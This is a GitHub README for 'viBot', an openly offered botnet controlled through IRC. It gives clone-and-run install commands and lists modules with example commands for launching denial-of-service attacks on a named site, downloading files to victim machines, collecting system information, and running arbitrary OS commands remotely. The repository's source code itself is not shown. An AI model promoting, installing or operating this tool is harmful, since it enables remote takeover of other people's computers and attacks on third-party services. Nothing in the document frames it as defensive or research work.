# viBot
A fully native and cross-platform botnet project, that uses IRC as C&amp;C server.

# Installation

```
~$ git clone https://github.com/blackvkng/viBot.git
~$ cd viBot
~$ python2 viBot.py
```
# Usage
``` irc client: [module] [ARGS] ```

# Available Modules

* dos module // start a dos attack to target
    * usage
      * irc client: dos set target www.google.com
      * irc client: dos start
      
* info module // get some info about target system
  * usage
    * irc client: info

* wget module // download files to target from internet
  * usage
    * irc client: wget FILEURL FILE NAME TO SAVE
    
* popup module // show a popup message on target system
  * usage
    * irc client: popup TEXT
    
* execute module // execute os commands on target and get output of commands
  * usage
    * irc client: execute COMMAND
      
# Screenshots
#### dos module
![alt tag](https://raw.githubusercontent.com/blackvkng/viBot/master/screenshots/vi1.png)

#### info module
![alt tag](https://raw.githubusercontent.com/blackvkng/viBot/master/screenshots/vi2.png)

#### wget module
![alt tag](https://raw.githubusercontent.com/blackvkng/viBot/master/screenshots/vi3.png)

#### popup module
![alt tag](https://raw.githubusercontent.com/blackvkng/viBot/master/screenshots/vi4.png)

#### execute module
![alt tag](https://raw.githubusercontent.com/blackvkng/viBot/master/screenshots/vi5.png)

# Demo
[![alt tag](https://img.youtube.com/vi/IqwJdVBoxsA/0.jpg)](https://www.youtube.com/watch?v=IqwJdVBoxsA)

